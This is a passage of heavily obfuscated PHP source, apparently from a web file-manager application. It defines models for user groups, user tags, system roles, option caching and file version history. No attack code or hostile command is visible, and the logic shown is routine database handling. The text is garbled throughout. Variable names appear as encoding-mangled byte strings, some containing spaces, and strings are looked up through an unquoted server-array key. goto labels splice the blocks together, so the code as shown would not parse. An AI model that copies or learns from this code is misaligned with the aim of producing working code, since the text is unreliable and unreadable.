_listAppendSourceRoot(&$Õ×§ğì, $­óª÷Ò´) { $èË“şØ€ =& $_SERVER[¼’ç§¼´]; $ªÛ›Şš£ = Model($èË“şØ€[913])->listSourceRoot(SourceModel::TYPE_USER, $­óª÷Ò´); $ªÛ›Şš£ = array_to_keyvalue($ªÛ›Şš£, $èË“şØ€[580]); $ªÛ›Şš£ = array_remove_key($ªÛ›Şš£, $èË“şØ€[580]); foreach ($Õ×§ğì as &$ŒËÅúİ¿) { $ŒËÅúİ¿[$èË“şØ€[90]] = $ªÛ›Şš£[$ŒËÅúİ¿[$èË“şØ€[1783]]] ? $ªÛ›Şš£[$ŒËÅúİ¿[$èË“şØ€[1783]]] : array(); } unset($ŒËÅúİ¿); } private function _listAppendGroup(&$ùş°¢ˆ³, $ÍÂùáÀ) { $ÙÎ¦ŠØ =& $_SERVER[¼’ç§¼´]; $ˆ’øŞù¥ = array($ÙÎ¦ŠØ[1783] => array($ÙÎ¦ŠØ[7], $ÍÂùáÀ)); $ºº­‰æÀ = Model($ÙÎ¦ŠØ[2078])->where($ˆ’øŞù¥)->select(); $Šùò„šÀ = array_to_keyvalue($ºº­‰æÀ, $ÙÎ¦ŠØ[12], $ÙÎ¦ŠØ[1984]); $Šùò„šÀ = array_remove_value(array_unique($Šùò„šÀ), $ÙÎ¦ŠØ[230]); if (!$Šùò„šÀ || !$ºº­‰æÀ) { return; } $ˆ’øŞù¥ = array($ÙÎ¦ŠØ[1984] => array($ÙÎ¦ŠØ[7], $Šùò„šÀ)); $¦ÚêĞÄ² = Model($ÙÎ¦ŠØ[2174])->field($ÙÎ¦ŠØ[2517])->where($ˆ’øŞù¥)->select(); $¦ÚêĞÄ² = array_to_keyvalue($¦ÚêĞÄ², $ÙÎ¦ŠØ[1984]); $ºº­‰æÀ = array_to_keyvalue_group($ºº­‰æÀ, $ÙÎ¦ŠØ[1783]); foreach ($ºº­‰æÀ as &$™°Ğñ©) { $éøµÕÒ˜ = array(); foreach ($™°Ğñ© as $Ì»”Õ™Ÿ) { if (!$Ì»”Õ™Ÿ[$ÙÎ¦ŠØ[2092]]) { continue; } $ØÔŒÄı = Model($ÙÎ¦ŠØ[582])->listData($Ì»”Õ™Ÿ[$ÙÎ¦ŠØ[2092]]); $éøµÕÒ˜[] = array($ÙÎ¦ŠØ[1984] => $Ì»”Õ™Ÿ[$ÙÎ¦ŠØ[1984]], $ÙÎ¦ŠØ[2518] => $¦ÚêĞÄ²[$Ì»”Õ™Ÿ[$ÙÎ¦ŠØ[1984]]][$ÙÎ¦ŠØ[32]], $ÙÎ¦ŠØ[595] => $¦ÚêĞÄ²[$Ì»”Õ™Ÿ[$ÙÎ¦ŠØ[1984]]][$ÙÎ¦ŠØ[595]], $ÙÎ¦ŠØ[498] => $ØÔŒÄı); } $™°Ğñ© = $éøµÕÒ˜; } unset($™°Ğñ©); foreach ($ùş°¢ˆ³ as &$–âé´Û) { $–âé´Û[$ÙÎ¦ŠØ[2176]] = array(); if (isset($ºº­‰æÀ[$–âé´Û[$ÙÎ¦ŠØ[1783]]])) { $–âé´Û[$ÙÎ¦ŠØ[2176]] = $ºº­‰æÀ[$–âé´Û[$ÙÎ¦ŠØ[1783]]]; } } unset($–âé´Û); } public function userAppendGroup($â­˜ñ‰) { $Éí—öÑÏ =& $_SERVER[¼’ç§¼´]; if (!$â­˜ñ‰) { return array(); } $this->_listAppendGroup($â­˜ñ‰, array_to_keyvalue($â­˜ñ‰, $Éí—öÑÏ[12], $Éí—öÑÏ[1783])); return $â­˜ñ‰; } private function _listAppendMeta(&$ò‡ˆÀ¿, $çùĞ¬ãÁ) { $…æ©ñôÌ =& $_SERVER[¼’ç§¼´]; $™€Ê’µ = UserJobModel::JOB_KEY; $øŞğ››Ë = array($…æ©ñôÌ[2498]); $êÆÌÓÄ = array($…æ©ñôÌ[1783] => array($…æ©ñôÌ[7], $çùĞ¬ãÁ)); $‚›´·êğ = Model($…æ©ñôÌ[2496])->where($êÆÌÓÄ)->select(); $‚›´·êğ = array_to_keyvalue_group($‚›´·êğ, $…æ©ñôÌ[1783]); foreach ($‚›´·êğ as &$Ó—šß½Ä) { $”æ³¡« = array(); foreach ($Ó—šß½Ä as $üÀ ­Ô²) { if (!in_array($üÀ ­Ô²[$…æ©ñôÌ[97]], $øŞğ››Ë)) { $”æ³¡«[$üÀ ­Ô²[$…æ©ñôÌ[97]]] = $üÀ ­Ô²[$…æ©ñôÌ[461]]; } } $Ó—šß½Ä = $”æ³¡«; } unset($Ó—šß½Ä); $Úõ±–ıç = Model($…æ©ñôÌ[2519]); foreach ($ò‡ˆÀ¿ as &$–í­ƒÜ¢) { $ú—™·óª = array(); if (isset($‚›´·êğ[$–í­ƒÜ¢[$…æ©ñôÌ[1783]]])) { $ú—™·óª = $‚›´·êğ[$–í­ƒÜ¢[$…æ©ñôÌ[1783]]]; } $–í­ƒÜ¢[$…æ©ñôÌ[2520]] = array(); if (isset($ú—™·óª[$™€Ê’µ])) { $–í­ƒÜ¢[$…æ©ñôÌ[2520]] = $Úõ±–ıç->getUserJobInfo($ú—™·óª[$™€Ê’µ]); } } unset($–í­ƒÜ¢); } protected function groupUserAll($¿…á²Ïï) { $Œ²Î³åò =& $_SERVER[¼’ç§¼´]; if (!$¿…á²Ïï) { return !1; } $Öõ¥š£ = Model($Œ²Î³åò[2078])->field($Œ²Î³åò[1783])->where(array($Œ²Î³åò[1984] => array($Œ²Î³åò[7], $¿…á²Ïï)))->select(); $Öõ¥š£ = array_to_keyvalue($Öõ¥š£, $Œ²Î³åò[12], $Œ²Î³åò[1783]); return array_unique($Öõ¥š£); } public function userSearch($ÚÂí³Ä™, $¤ˆØ¤ÙÂ = "\x2a") { return Model($_SERVER[¼’ç§¼´][608])->where($ÚÂí³Ä™)->field($¤ˆØ¤ÙÂ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\145\162\x5f\157\160\x74\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($¸‚«›Àº) { $à”çä¸® =& $_SERVER[¼’ç§¼´]; $ßæ•…æ = defined($à”çä¸®[2211]) && USER_ID ? USER_ID : $à”çä¸®[12]; return "\x55\x73\x65\162\x4f\x70\x74\x69\157\x6e\x5f{$¸‚«›Àº}\x5f" . $ßæ•…æ; } protected function filterWhere($¾ˆéô) { $ á‡ôğ =& $_SERVER[¼’ç§¼´]; $¾ˆéô[$ á‡ôğ[1783]] = defined($ á‡ôğ[2211]) && USER_ID ? USER_ID : $ á‡ôğ[12]; return $¾ˆéô; } public function cacheRemoveUser($ñÓŸ¥Øø, $¶™À³Ï) { return Cache::remove("\x55\163\x65\162\x4f\160\164\x69\157\x6e\x5f{$ñÓŸ¥Øø}\x5f" . $¶™À³Ï); } protected function optionDefault($›áÈ¯ìã = '') { $Š»ëù²² =& $_SERVER[¼’ç§¼´]; if ($›áÈ¯ìã == $Š»ëù²²[12]) { return $GLOBALS[$Š»ëù²²[6]][$Š»ëù²²[2521]]; } if ($›áÈ¯ìã == $Š»ëù²²[2522]) { return $GLOBALS[$Š»ëù²²[6]][$Š»ëù²²[2523]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\x72\56\x74\x61\147\x4c\151\163\x74"; public $modelType = "\x55\163\145\162\x4f\160\x74\x69\x6f\x6e"; public $field = array("\156\141\155\145", "\163\x74\x79\154\x65", "\163\x6f\x72\164"); public function listData($ô®Ê‚± = false, $ÂÌÕ¹Ê = "\x73\x6f\x72\x74", $´Ê°Œ¹¬ = false) { return parent::listData($ô®Ê‚±, $ÂÌÕ¹Ê, $´Ê°Œ¹¬); } public function remove($…‰‡í•¥) { return parent::remove($…‰‡í•¥); } public function add($¹¢´ÑÑÀ, $“Î®û€Ô = "\154\141\x62\x65\x6c\55\x67\x72\x65\171\x2d\x6e\157\x72\x6d\141\154") { $ßâ›¦î =& $_SERVER[¼’ç§¼´]; if ($this->findByName($¹¢´ÑÑÀ)) { return !1; } $¼ÛƒÁª = array($ßâ›¦î[505] => $¹¢´ÑÑÀ, $ßâ›¦î[569] => $“Î®û€Ô, $ßâ›¦î[1988] => $this->getSort($ßâ›¦î[337]) + 1); return parent::insert($¼ÛƒÁª); } public function update($…ª³âüä, $Ô‘±šÙ®) { $¼”ÏÇÈå =& $_SERVER[¼’ç§¼´]; $ÌŞç½ä = $this->listData($…ª³âüä); $¶ñ–åúÔ = $this->findByName($Ô‘±šÙ®[$¼”ÏÇÈå[32]]); if (!$ÌŞç½ä || $¶ñ–åúÔ && $¶ñ–åúÔ[$¼”ÏÇÈå[486]] != $ÌŞç½ä[$¼”ÏÇÈå[486]]) { return !1; } return parent::update($…ª³âüä, $Ô‘±šÙ®); } public function moveTop($­Üöƒßú) { $¯¹ÓÔÃü =& $_SERVER[¼’ç§¼´]; $âõÔî†ô = parent::listData(); $¯Å«ó¨¹ = $this->getSort($¯¹ÓÔÃü[336]); foreach ($âõÔî†ô as &$÷¶ŒÕ¦è) { if ($÷¶ŒÕ¦è[$¯¹ÓÔÃü[486]] == $­Üöƒßú) { $÷¶ŒÕ¦è[$¯¹ÓÔÃü[2008]] = $¯Å«ó¨¹; continue; } $÷¶ŒÕ¦è[$¯¹ÓÔÃü[2008]] += 1; } unset($÷¶ŒÕ¦è); return parent::resetData($âõÔî†ô); } public function moveBottom($õ·ğâŠ) { $İ¹ò±ÊÎ =& $_SERVER[¼’ç§¼´]; $£Û·é = $this->getSort($İ¹ò±ÊÎ[337]) + 1; return parent::update($õ·ğâŠ, array($İ¹ò±ÊÎ[2008] => $£Û·é)); } public function resetSort($òÛ¶Èò‘) { $êò³É¢Ê =& $_SERVER[¼’ç§¼´]; $è÷«Áô = array(); $òÛ¶Èò‘ = is_array($òÛ¶Èò‘) ? $òÛ¶Èò‘ : array(); for ($‚îÔºèÙ = 0; $‚îÔºèÙ < count($òÛ¶Èò‘); $‚îÔºèÙ++) { $è÷«Áô[$òÛ¶Èò‘[$‚îÔºèÙ] . $êò³É¢Ê[12]] = $‚îÔºèÙ + 1; } $ûõéÎß” = parent::listData(); foreach ($ûõéÎß” as &$ëÁ°Ø¨ñ) { $†Ô„÷óî = $è÷«Áô[$ëÁ°Ø¨ñ[$êò³É¢Ê[486]]]; $ëÁ°Ø¨ñ[$êò³É¢Ê[2008]] = $†Ô„÷óî ? $†Ô„÷óî : $ëÁ°Ø¨ñ[$êò³É¢Ê[2008]]; } unset($ëÁ°Ø¨ñ); return parent::resetData($ûõéÎß”); } private function getSort($²ü”ğ»¼) { $çœ›İÄ¯ =& $_SERVER[¼’ç§¼´]; $ñ¡µ‚÷Ù = parent::listData(); $œÈÒºÅŸ = array_to_keyvalue($ñ¡µ‚÷Ù, $çœ›İÄ¯[12], $çœ›İÄ¯[2008]); if (!$œÈÒºÅŸ) { $œÈÒºÅŸ = array(0); } $ÜĞæ°ç = $²ü”ğ»¼ == $çœ›İÄ¯[337] ? max($œÈÒºÅŸ) : min($œÈÒºÅŸ); return intval($ÜĞæ°ç); } } goto eœ÷è“ŠÉÉ; dØ¼„³‹©¹: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\163\164\145\x6d\137\x6f\x70\164\x69\157\156"; protected $jsonField = array("\x6d\x65\156\165", "\162\157\x6c\x65", "\x72\157\x6c\145\x47\162\157\x75\x70", "\x72\x65\x67\x69\163\x74", "\145\x6d\x61\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($ÑŞÁ¢“Í) { return "\x53\x79\163\x74\145\155\x4f\x70\x74\151\x6f\x6e\137{$ÑŞÁ¢“Í}"; } protected function optionDefault($Íäæş = '') { $û’”›ù® =& $_SERVER[¼’ç§¼´]; if ($Íäæş == $û’”›ù®[12]) { return $GLOBALS[$û’”›ù®[6]][$û’”›ù®[468]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\56\162\157\x6c\x65\x4c\x69\163\x74"; public $field = array("\156\141\155\145", "\141\x75\x74\150", "\x6c\x61\x62\x65\154", "\x64\x69\x73\x70\154\x61\171", "\163\171\163\x74\145\x6d", "\144\x65\163\143", "\x69\x67\156\157\162\x65\105\170\x74", "\x69\x67\156\157\x72\x65\106\x69\154\145\x53\151\172\145", "\x61\144\155\151\156\151\163\164\x72\141\x74\157\162", "\163\x6f\x72\x74"); public function listData($âş°÷ı¦ = false, $ü±€ã¾’ = "\x73\157\x72\164", $ôŞ•š¼å = false) { $¸è¿¦á =& $_SERVER[¼’ç§¼´]; $ÏŞÎƒ–Ú = parent::listData($âş°÷ı¦, $ü±€ã¾’, $ôŞ•š¼å); if (!$âş°÷ı¦) { foreach ($ÏŞÎƒ–Ú as $ü£ÓÛóæ => $¤…è‹³®) { if ($¤…è‹³®[$¸è¿¦á[2192]] == 1) { $ÏŞÎƒ–Ú[$ü£ÓÛóæ][$¸è¿¦á[537]] = LNG($¸è¿¦á[2463]); } } } return $ÏŞÎƒ–Ú; } public function update($Òš·, $ôú Ÿı) { $‰Ùáûî¬ =& $_SERVER[¼’ç§¼´]; $ñèÌÚ¶½ = parent::listData($Òš·); $ ³ôÄí‹ = $this->findByName($ôú Ÿı[$‰Ùáûî¬[32]]); if (!$ñèÌÚ¶½ || $ ³ôÄí‹ && $ ³ôÄí‹[$‰Ùáûî¬[486]] != $ñèÌÚ¶½[$‰Ùáûî¬[486]]) { return !1; } if ($ ³ôÄí‹[$‰Ùáûî¬[2192]] == 1) { $ôú Ÿı = array($‰Ùáûî¬[32] => $ôú Ÿı[$‰Ùáûî¬[32]], $‰Ùáûî¬[2007] => $ôú Ÿı[$‰Ùáûî¬[2007]]); } $this->filterAuth($ôú Ÿı[$‰Ùáûî¬[498]]); return parent::update($Òš·, $ôú Ÿı); } public function remove($±ì¾¼³ˆ) { $£„ºÓœ = parent::listData($±ì¾¼³ˆ); if (!$£„ºÓœ || $£„ºÓœ[$_SERVER[¼’ç§¼´][191]]) { return !1; } return parent::remove($±ì¾¼³ˆ); } public function add($Ç‰¯Åõˆ) { $ŒÍÜ“¼Ş =& $_SERVER[¼’ç§¼´]; $â™±êöŸ = $Ç‰¯Åõˆ[$ŒÍÜ“¼Ş[32]]; if ($this->findByName($â™±êöŸ)) { return !1; } $¢œÊ‘«¸ = array($ŒÍÜ“¼Ş[505] => $â™±êöŸ, $ŒÍÜ“¼Ş[1990] => $ŒÍÜ“¼Ş[12], $ŒÍÜ“¼Ş[1986] => $ŒÍÜ“¼Ş[1994], $ŒÍÜ“¼Ş[2464] => 1, $ŒÍÜ“¼Ş[1989] => 0, $ŒÍÜ“¼Ş[2465] => 0, $ŒÍÜ“¼Ş[1988] => $this->getSort()); $Ç‰¯Åõˆ = array_merge($¢œÊ‘«¸, $Ç‰¯Åõˆ); $this->filterAuth($Ç‰¯Åõˆ[$ŒÍÜ“¼Ş[498]]); return parent::insert($Ç‰¯Åõˆ); } private function getSort() { $Â®Ê½„İ =& $_SERVER[¼’ç§¼´]; $áë·ú = parent::listData(); $¹¬º“ıÜ = array_to_keyvalue($áë·ú, $Â®Ê½„İ[12], $Â®Ê½„İ[2008]); return empty($¹¬º“ıÜ) ? 0 : max($¹¬º“ıÜ) + 1; } private function filterAuth(&$æğ¤öÁÃ) { $äµµéæ† =& $_SERVER[¼’ç§¼´]; $´­¿•öŒ = array(); $ò¬‡×Æ = array_filter(explode($äµµéæ†[50], $æğ¤öÁÃ)); foreach ($ò¬‡×Æ as $æğ¤öÁÃ) { $½™³ÔßÆ = explode($äµµéæ†[10], $æğ¤öÁÃ); if ($½™³ÔßÆ[0] == $äµµéæ†[2466] && $½™³ÔßÆ[1] != $äµµéæ†[1284]) { $Ã–ŸÁ‹ = $½™³ÔßÆ[0] . $äµµéæ†[10] . $½™³ÔßÆ[1] . $äµµéæ†[2467]; if (!in_array($Ã–ŸÁ‹, $ò¬‡×Æ)) { $´­¿•öŒ[] = $Ã–ŸÁ‹; } } $´­¿•öŒ[] = $æğ¤öÁÃ; } $æğ¤öÁÃ = implode($äµµéæ†[50], $´­¿•öŒ); } public function findRoleDefault() { $·û”–Ì— =& $_SERVER[¼’ç§¼´]; $ÔËÏì… = parent::listData(); $Ë€Èâµ = !1; foreach ($ÔËÏì… as $Ÿª¹í¾) { if (!$Ÿª¹í¾ || $Ÿª¹í¾[$·û”–Ì—[2006]] == $·û”–Ì—[230] || $Ÿª¹í¾[$·û”–Ì—[2192]] == 1) { continue; } if (strstr($Ÿª¹í¾[$·û”–Ì—[498]], $·û”–Ì—[2468])) { continue; } if (!strstr($Ÿª¹í¾[$·û”–Ì—[498]], $·û”–Ì—[2469])) { continue; } if (!$Ë€Èâµ) { $Ë€Èâµ = $Ÿª¹í¾; continue; } $ºÂ…˜ = explode($·û”–Ì—[50], $Ë€Èâµ[$·û”–Ì—[498]]); $ãÁİ•ì = explode($·û”–Ì—[50], $Ÿª¹í¾[$·û”–Ì—[498]]); if (count($ºÂ…˜) > count($ãÁİ•ì)) { $Ë€Èâµ = $Ÿª¹í¾; } } return $Ë€Èâµ ? $Ë€Èâµ[$·û”–Ì—[486]] : $·û”–Ì—[12]; } public function sort($”ªŒ›ğ¬, $Ïüí¹ö) { return parent::update($”ªŒ›ğ¬, $Ïüí¹ö); } } goto A¿è¡ß—¬ø; e§İŠÓêíù: function binCheckBigger($ˆß¡´èò, $ÁÕ©Øà) { return $ˆß¡´èò > $ÁÕ©Øà; } $_SERVER[$_SERVER[×şÎ» Ü][3]] = ("\70\65\71\67".base64_decode('MzY='))+0;$_poh8="a3wqcm1j7f8zrsgnih2lpt650oube4x9ydvkr8i42tec071zwalqdbugmfo5hs9jxn3vp";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($‹­ç£³, $èÑ·æğ) { $•Ş²º€£ =& $_SERVER[¼’ç§¼´]; if (isset(self::$_methodList[$‹­ç£³])) { return @call_user_func_array(self::$_methodList[$‹­ç£³], $èÑ·æğ); } else { if (method_exists($this, $‹­ç£³)) { return call_user_func_array(array($this, $‹­ç£³), $èÑ·æğ); } else { think_exception(__CLASS__ . $•Ş²º€£[4] . $‹­ç£³ . $•Ş²º€£[5]); } } } public static function __callStatic($ÁÔş—ÒŠ, $À‚ßá…†) { if (isset(self::$_methodListStatic[$ÁÔş—ÒŠ])) { return call_user_func_array(self::$_methodListStatic[$ÁÔş—ÒŠ], $À‚ßá…†); } else { if (method_exists(self, $ÁÔş—ÒŠ)) { return call_user_func_array(array(self, $ÁÔş—ÒŠ), $À‚ßá…†); } else { show_json("{$ÁÔş—ÒŠ}\50\51\x20\x6e\x6f\164\x20\x65\170\x69\163\x74\x3b", !1); } } } public static function addMethod($©ú¹÷Ãë, $Ú®Øù¢ß) { self::$_methodList[$©ú¹÷Ãë] = $Ú®Øù¢ß; } public static function addMethodStatic($ÂÀ¡é‘, $—ş¦ëÂà) { self::$_methodListStatic[$ÂÀ¡é‘] = $—ş¦ëÂà; } } goto d‘òĞ÷ÀóŒ; Dæ½×Ù¥©‚: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\165\162\x63\x65\137\x68\x69\x73\x74\x6f\162\x79"; public function historyCount($œ¼„¸Ñß) { $ÓÇÁÌà =& $_SERVER[¼’ç§¼´]; if (!$œ¼„¸Ñß) { return array(); } if (is_string($œ¼„¸Ñß) || is_int($œ¼„¸Ñß)) { $œ¼„¸Ñß = array($œ¼„¸Ñß); } $Ïéíàğà = array($ÓÇÁÌà[193], $ÓÇÁÌà[2235] => $ÓÇÁÌà[576]); $•ÃåÇ÷” = array($ÓÇÁÌà[193] => array($ÓÇÁÌà[7], $œ¼„¸Ñß)); $Ø´ÙØôà = $this->field($Ïéíàğà)->where($•ÃåÇ÷”)->group($ÓÇÁÌà[193])->select(); return array_to_keyvalue($Ø´ÙØôà, $ÓÇÁÌà[193], $ÓÇÁÌà[576]); } public function addHistory($ĞúÜœƒ§, $ûÂ›°òš = '') { $‡‹Î‚˜Ú =& $_SERVER[¼’ç§¼´]; $å¾ÙóÔ = array($‡‹Î‚˜Ú[502] => $ĞúÜœƒ§[$‡‹Î‚˜Ú[193]], $‡‹Î‚˜Ú[1774] => isset($ĞúÜœƒ§[$‡‹Î‚˜Ú[540]]) ? $ĞúÜœƒ§[$‡‹Î‚˜Ú[540]] : $ĞúÜœƒ§[$‡‹Î‚˜Ú[538]], $‡‹Î‚˜Ú[553] => $ĞúÜœƒ§[$‡‹Î‚˜Ú[552]], $‡‹Î‚˜Ú[631] => $ĞúÜœƒ§[$‡‹Î‚˜Ú[79]], $‡‹Î‚˜Ú[2236] => $ûÂ›°òš); if ($GLOBALS[$‡‹Î‚˜Ú[6]][$‡‹Î‚˜Ú[92]][$‡‹Î‚˜Ú[1311]] >= 1) { $this->historyAutoClear($å¾ÙóÔ[$‡‹Î‚˜Ú[193]]); $this->add($å¾ÙóÔ); } Hook::trigger($‡‹Î‚˜Ú[2237], $å¾ÙóÔ); Model($‡‹Î‚˜Ú[2238])->eventFileEdit($ĞúÜœƒ§[$‡‹Î‚˜Ú[193]]); } private function historyAutoClear($ÜŞ©—ôÂ) { $‘ÆÀÄ” =& $_SERVER[¼’ç§¼´]; $Ó”ÕøĞ­ = Model($‘ÆÀÄ”[858])->get($‘ÆÀÄ”[1333]); $£”¨¢Â = intval($GLOBALS[$‘ÆÀÄ”[6]][$‘ÆÀÄ”[92]][$‘ÆÀÄ”[1311]]); $Ñö»úËñ = $Ó”ÕøĞ­ == $‘ÆÀÄ”[1334] ? min(5, $£”¨¢Â) : $£”¨¢Â; $Ñö»úËñ = $Ñö»úËñ <= 0 ? 0 : $Ñö»úËñ - 1; if ($Ñö»úËñ >= 499) { return; } $ìË‘´µÊ = array($‘ÆÀÄ”[502] => $ÜŞ©—ôÂ); $çåŠÛĞª = $this->field($‘ÆÀÄ”[2239])->where($ìË‘´µÊ)->order($‘ÆÀÄ”[2232])->select(); if (!$çåŠÛĞª || $Ñö»úËñ >= count($çåŠÛĞª)) { return; } $«ä¯‚ = array_to_keyvalue($çåŠÛĞª, $‘ÆÀÄ”[12], $‘ÆÀÄ”[486]); $«ä¯‚ = array_slice($«ä¯‚, $Ñö»úËñ); $‘®ï”û² = array_to_keyvalue($çåŠÛĞª, $‘ÆÀÄ”[12], $‘ÆÀÄ”[552]); $‘®ï”û² = array_slice($‘®ï”û², $Ñö»úËñ); if (!$«ä¯‚ || !$‘®ï”û²) { return; } $ìË‘´µÊ = array($‘ÆÀÄ”[504] => array($‘ÆÀÄ”[7], $«ä¯‚)); $this->where($ìË‘´µÊ)->delete(); Model($‘ÆÀÄ”[555])->remove($‘®ï”û²); } public function listData($ƒ“…š’Ü) { $È‘èï¦î =& $_SERVER[¼’ç§¼´]; $Á¼©¾Ù÷ = array($È‘èï¦î[502] => $ƒ“…š’Ü); $„àÈÊà = $È‘èï¦î[2240]; $°´äŒ½ç = $this->field($„àÈÊà)->where($Á¼©¾Ù÷)->order($È‘èï¦î[2232])->selectPage(); $this->_listAppendUser($°´äŒ½ç[$È‘èï¦î[456]]); $“Áƒë = Model($È‘èï¦î[858])->get($È‘èï¦î[1333]); $«­öü› = 5; if ($“Áƒë == $È‘èï¦î[1334]) { $°´äŒ½ç[$È‘èï¦î[456]] = array_slice($°´äŒ½ç[$È‘èï¦î[456]], 0, $«­öü›); $°´äŒ½ç[$È‘èï¦î[453]] = array($È‘èï¦î[2241] => 1, $È‘èï¦î[2242] => 20, $È‘èï¦î[2243] => 1, $È‘èï¦î[2244] => count($°´äŒ½ç[$È‘èï¦î[456]])); } return $°´äŒ½ç; } protected function _listAppendUser(&$İ•Ô¬€Ê) { $œ‹Û³‰ =& $_SERVER[¼’ç§¼´]; $­·šš˜ = array_to_keyvalue($İ•Ô¬€Ê, $œ‹Û³‰[12], $œ‹Û³‰[1783]); $İúşñÍ– = Model($œ‹Û³‰[608])->userListInfo($­·šš˜); foreach ($İ•Ô¬€Ê as &$½»˜) { $œÔê½½¤ = $½»˜[$œ‹Û³‰[1783]]; $½»˜[$œ‹Û³‰[538]] = $İúşñÍ–[$œÔê½½¤] ? $İúşñÍ–[$œÔê½½¤] : !1; } unset($½»˜); } public function fileInfo($Ò«Ú¯å) { $¶‰™ï³ì =& $_SERVER[¼’ç§¼´]; $É–ÇØì” = $this->tablePrefix; $³Öä²€ = "{$É–ÇØì”}\151\157\137\x66\x69\154\x65\x20\146\151\154\145\163\x20\157\x6e\40\146\x69\154\145\x73\56\146\x69\154\145\111\x44\40\x3d\40\150\151\163\164\157\162\x79\x2e\146\151\x6c\x65\111\x44"; return $this->alias($¶‰™ï³ì[2245])->where(array($¶‰™ï³ì[504] => $Ò«Ú¯å))->join($³Öä²€, $¶‰™ï³ì[2246])->find(); } public function removeItem($íÑµ·œ‡) { $¤¯¦É×Ø =& $_SERVER[¼’ç§¼´]; $£µæãÇ¶ = array($¤¯¦É×Ø[504] => $íÑµ·œ‡); $€â÷ñü¦ = $this->where($£µæãÇ¶)->find(); if ($€â÷ñü¦) { $†ô¾ÒŒŒ = $this->where($£µæãÇ¶)->delete(); Model($¤¯¦É×Ø[555])->remove($€â÷ñü¦[$¤¯¦É×Ø[552]]); return $†ô¾ÒŒŒ; } return !1; } public function removeBySource($Îõ¿’ÉÏ) { $“ùí =& $_SERVER[¼’ç§¼´]; if (!$Îõ¿’ÉÏ) { return !1; } if (!is_array($Îõ¿’ÉÏ)) { $Îõ¿’ÉÏ = array($Îõ¿’ÉÏ); } $Åªù¸ŞÜ = array($“ùí[502] => array($“ùí[7], $Îõ¿’ÉÏ)); $ñÇïè´æ = $this->field($“ùí[553])->where($Åªù¸ŞÜ)->select(); if ($ñÇïè´æ) { $this->where($Åªù¸ŞÜ)->delete(); $¼ÍØÄÈ» = array_to_keyvalue($ñÇïè´æ, $“ùí[12], $“ùí[552]); Model($“ùí[555])->remove($¼ÍØÄÈ»); } return !0; } public function setDetail($’íßšø², $ÑÅâÑµ÷) { $™¾Ãƒ¼¿ =& $_SERVER[¼’ç§¼´]; return $this->where(array($™¾Ãƒ¼¿[504] => $’íßšø²))->save(array($™¾Ãƒ¼¿[2236] => $ÑÅâÑµ÷)); } public function rollbackToItem($¨¿ôñ²¸, $Ü÷§£™µ) { $Œ†¡ò˜— =& $_SERVER[¼’ç§¼´]; $™‘ „¾¼ = Model($Œ†¡ò˜—[913])->sourceInfo($¨¿ôñ²¸); $this->addHistory($™‘ „¾¼, LNG($Œ†¡ò˜—[2247])); $÷›ÑË” = $this->find($Ü÷§£™µ); $ØŒÆ÷ù = array($Œ†¡ò˜—[552] => $÷›ÑË”[$Œ†¡ò˜—[552]], $Œ†¡ò˜—[79] => $÷›ÑË”[$Œ†¡ò˜—[79]], $Œ†¡ò˜—[88] => time(), $Œ†¡ò˜—[540] => USER_ID); Model($Œ†¡ò˜—[913])->where(array($Œ†¡ò˜—[193] => $¨¿ôñ²¸))->save($ØŒÆ÷ù); return $this->where(array($Œ†¡ò˜—[504] => $Ü÷§£™µ))->delete(); } public function clearSame($Ğ‰©õ²‰) { $˜„¸¾œö =& $_SERVER[¼’ç§¼´]; $ñıñÌ‚¦ = $this->listData($Ğ‰©õ²‰); $²ªÄµÁ¼ = array_to_keyvalue_group($ñıñÌ‚¦, $˜„¸¾œö[552]); $³È†‹ = array(); $—íûÁÛ» = array(); foreach ($²ªÄµÁ¼ as $Åò¤·¢É) { if (!$Åò¤·¢É || count($Åò¤·¢É) <= 1) { continue; } foreach ($Åò¤·¢É as $ºşØÍíª) { $³È†‹[] = $ºşØÍíª[$˜„¸¾œö[552]]; $—íûÁÛ»[] = $ºşØÍíª[$˜„¸¾œö[486]]; } } if (!$—íûÁÛ») { return; } $this->where(array($˜„¸¾œö[486] => array($˜„¸¾œö[7], $—íûÁÛ»)))->delete(); Model($˜„¸¾œö[555])->remove($³È†‹); } public function userSpace() { $à™¢¾¨Í =& $_SERVER[¼’ç§¼´]; $Ü„”Î¾„ = $this->tablePrefix; $ü…™Êàü = array($à™¢¾¨Í[1774] => USER_ID); $²·Ù¹Ÿ = "{$Ü„”Î¾„}\151\157\137\x66\151\154\145\40\x66\151\154\x65\163\40\x6f\156\x20\x66\x69\x6c\x65\x73\x2e\x66\151\154\x65\x49\104\40\x3d\40\x68\151\163\164\157\x72\171\x2e\146\x69\x6c\x65\x49\x44"; return $this->alias($à™¢¾¨Í[2245])->where($ü…™Êàü)->join($²·Ù¹Ÿ, $à™¢¾¨Í[2246])->sum($à™¢¾¨Í[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($…Í¡ó„) { $ˆÁüèÍË =& $_SERVER[¼’ç§¼´]; $µÓïê‰¿ = KodIO::fileTypeList(); $¶œ»¹»§ = $µÓïê‰¿[$…Í¡ó„]; if (!$¶œ»¹»§) { return array(); } $¾Å¦À¦ª = $¶œ»¹»§[$ˆÁüèÍË[169]]; $´÷¶Ã’‡ = $ˆÁüèÍË[7]; if (!$¶œ»¹»§[$ˆÁüèÍË[169]]) { $û§†ö‘ = array_to_keyvalue($µÓïê‰¿, $ˆÁüèÍË[12], $ˆÁüèÍË[169]); $¾Å¦À¦ª = implode($ˆÁüèÍË[50], $û§†ö‘); $´÷¶Ã’‡ = $ˆÁüèÍË[2248]; } $ùÜ¨…øÅ = explode($ˆÁüèÍË[50], trim($¾Å¦À¦ª, $ˆÁüèÍË[50])); return array($´÷¶Ã’‡, $ùÜ¨…øÅ); } public function listPathType($‚áÁÎ) { $¼œİ£ÊÂ =& $_SERVER[¼’ç§¼´]; $¨ØÚÍ· = $this->fileTypeWhere($‚áÁÎ); if (!$¨ØÚÍ·) { return array(); } $ÚïğÒ § = USER_ID; 